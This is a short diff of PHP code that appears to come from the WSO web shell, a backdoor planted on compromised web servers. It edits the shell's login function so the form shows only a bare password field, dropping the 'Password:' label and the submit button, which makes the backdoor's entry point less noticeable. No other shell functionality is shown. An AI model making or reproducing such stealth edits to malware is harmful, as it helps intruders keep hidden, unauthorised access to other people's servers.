@@ -33,7 +33,7 @@ if(get_magic_quotes_gpc()) {
 }
 
 function wsoLogin() {
-	die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
+	die("<pre align=center><form method=post><input type=password name=pass></form></pre>");
 }
 
 function WSOsetcookie($k, $v) {
